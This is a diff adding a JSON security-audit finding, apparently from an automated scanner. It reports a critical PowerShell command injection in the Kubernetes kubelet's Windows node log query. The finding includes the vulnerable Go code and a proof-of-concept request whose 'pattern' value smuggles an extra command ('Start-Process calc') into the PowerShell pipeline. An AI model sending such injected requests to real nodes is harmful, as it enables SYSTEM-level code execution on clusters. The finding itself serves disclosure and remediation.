@@ -1,0 +1,23 @@
+[
+  {
+    "FindingID": "cd8f15fe-dcb8-5177-8469-beefa384fd92",
+    "SessionID": "ChBhOGJiNDU0NDYzNDNlMmIwEAgaATAqBG1haW4",
+    "Title": "Command Injection via Unsanitized Regex Pattern in Node Log Query on Windows Nodes",
+    "FilePath": "/home/jfplante_google_com/repos/p18-kubernetes_rep2/pkg/kubelet/kubelet_server_journal_windows.go",
+    "Severity": "CRITICAL",
+    "Confidence": 100,
+    "Analysis": "### Trace\n1. **Source**: Untrusted user input enters the program via the HTTP query parameter `pattern` which is retrieved in `newNodeLogQuery` inside `pkg/kubelet/kubelet_server_journal.go`:\n   ```go\n   pattern := query.Get(\"pattern\")\n   if len(pattern) \u003e 0 {\n       nlq.Pattern = pattern\n   }\n   ```\n2. **Sanitization/Validation**: The pattern is only validated by checking if it parses as a standard Go/Perl-style regular expression using `syntax.Parse(n.Pattern, syntax.Perl)` in `pkg/kubelet/kubelet_server_journal.go`:\n   ```go\n   if _, err := syntax.Parse(n.Pattern, syntax.Perl); err != nil {\n       allErrs = append(allErrs, field.Invalid(field.NewPath(\"pattern\"), n.Pattern, err.Error()))\n   }\n   ```\n   This is entirely insufficient because single quotes (`'`), spaces (` `), semicolons (`;`), and arbitrary alphanumeric PowerShell sub-commands enclosed in balanced parentheses (e.g. `(Start-Process calc)`) are perfectly valid, standard syntax in regular expressions. No character escaping or sanitization of single quotes is performed.\n3. **Sink**: The pattern is formatted directly into a single-quoted string context in a PowerShell script string inside `pkg/kubelet/kubelet_server_journal_windows.go`:\n   ```go\n   if len(n.Pattern) \u003e 0 {\n       psCmd += fmt.Sprintf(\" | Where-Object -Property Message -Match '%s'\", n.Pattern)\n   }\n   ```\n   This command string is then executed directly via `powershell.exe -Command \u003cpsCmd\u003e` with local SYSTEM-level privileges of the Kubelet.\n\n### Conceptual Exploit Payload\nA request to the kubelet logging proxy endpoint with a query specifying a system service and a crafted pattern, such as:\n`GET /logs/?query=kubelet\u0026pattern=a';+Start-Process+calc;+%23`\n\nWhen processed on a Windows node, the formatted PowerShell command argument string becomes:\n`Get-WinEvent -FilterHashtable @{LogName='Application'; ProviderName='kubelet'} | Sort-Object TimeCreated | Where-Object -Property Message -Match 'a'; Start-Process calc; #' | Format-Table -AutoSize -Wrap`\n\nIn PowerShell, the single quote `'a'` closes the match string, the semicolon `;` acts as a statement separator, the payload `Start-Process calc` is executed as a separate statement, and the `#` comments out the rest of the command, leading to arbitrary command execution.",
+    "Snippet": "func getLoggingCmd(n *nodeLogQuery, services []string) (string, []string, error) {\n\targs := []string{\n\t\t\"-NonInteractive\",\n\t\t\"-ExecutionPolicy\", \"Bypass\",\n\t\t\"-Command\",\n\t}\n\n\tpsCmd := \"Get-WinEvent -FilterHashtable @{LogName='Application'\"\n\tif n.SinceTime != nil {\n\t\tpsCmd += fmt.Sprintf(\"; StartTime='%s'\", n.SinceTime.Format(dateLayout))\n\t}\n\tif n.UntilTime != nil {\n\t\tpsCmd += fmt.Sprintf(\"; EndTime='%s'\", n.UntilTime.Format(dateLayout))\n\t}\n\tvar providers []string\n\tfor _, service := range services {\n\t\tif len(service) \u003e 0 {\n\t\t\tproviders = append(providers, \"'\"+service+\"'\")\n\t\t}\n\t}\n\tif len(providers) \u003e 0 {\n\t\tpsCmd += fmt.Sprintf(\"; ProviderName=%s\", strings.Join(providers, \",\"))\n\t}\n\tpsCmd += \"}\"\n\tif n.TailLines != nil {\n\t\tpsCmd += fmt.Sprintf(\" -MaxEvents %d\", *n.TailLines)\n\t}\n\tpsCmd += \" | Sort-Object TimeCreated\"\n\tif len(n.Pattern) \u003e 0 {\n\t\tpsCmd += fmt.Sprintf(\" | Where-Object -Property Message -Match '%s'\", n.Pattern)\n\t}\n\tpsCmd += \" | Format-Table -AutoSize -Wrap\"\n\n\targs = append(args, psCmd)\n\n\treturn powershellExe, args, nil\n}",
+    "VulnType": "CWE-78",
+    "VulnID": "CWE-78",
+    "Fingerprint": "",
+    "Status": "OPEN",
+    "SourceStage": "",
+    "FindingJSON": "",
+    "UpdatedAt": "",
+    "StartLine": 31,
+    "EndLine": 67,
+    "DismissReason": "",
+    "ConfidenceLevel": ""
+  }
+]
